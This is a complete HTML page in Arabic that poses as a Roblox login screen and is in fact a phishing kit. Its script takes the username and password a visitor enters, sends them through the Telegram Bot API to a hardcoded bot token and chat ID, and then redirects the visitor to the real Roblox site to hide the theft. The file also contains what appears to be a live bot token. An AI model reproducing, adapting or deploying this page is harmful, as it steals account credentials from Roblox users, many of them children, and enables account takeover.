<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Roblox</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #2b2d42; /* Dark background */
            color: #ffffff; /* White text */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #3f3f3f; /* Dark gray for container */
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 400px; /* Fixed width for consistency */
        }
        h1 {
            margin-bottom: 20px;
            font-size: 32px;
            color: #ffcc00; /* Roblox yellow */
        }
        input {
            display: block;
            width: calc(100% - 20px); /* Adjusted for padding */
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444; /* Dark border */
            border-radius: 6px;
            font-size: 16px;
            background-color: #555; /* Dark input fields */
            color: white; /* White text for inputs */
        }
        button {
            background-color: #ffcc00; /* Roblox yellow */
            color: black; /* Black text for button */
            padding: 10px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
            width: 100%; /* Full width button */
            margin-top: 10px; /* Space above the button */
        }
        button:hover {
            background-color: #e6b800; /* Darker yellow on hover */
        }
        #result {
            margin-top: 15px;
            color: #ffcc00; /* Yellow for messages */
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc; /* Light gray for footer text */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>تسجيل الدخول إلى Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <p id="result"></p>
        <div class="footer">
            <p>لا تملك حساب؟ <a href="#" style="color: #ffcc00;">إنشاء حساب</a></p>
        </div>
    </div>

    <script>
        // Replace these with your actual Telegram Bot Token and Chat ID
        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
        const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var result = document.getElementById('result');
            
            var message = `🟢 بيانات تسجيل دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
                result.style.color = "#4CAF50"; // Green color for success messages
                
                // Redirect to Roblox after 1 second
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com";
                }, 1000); // 1 second delay
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
            });
        });
    </script>
</body>
</html>
